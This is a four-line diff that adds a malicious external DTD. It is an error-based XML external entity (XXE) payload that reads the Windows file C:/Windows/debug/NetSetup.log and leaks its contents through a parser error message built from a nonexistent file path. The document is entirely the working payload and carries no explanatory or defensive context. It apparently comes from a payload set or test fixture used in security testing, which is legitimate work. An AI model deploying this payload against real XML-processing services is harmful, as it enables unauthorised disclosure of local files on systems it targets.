@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///C:/Windows/debug/NetSetup.log">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
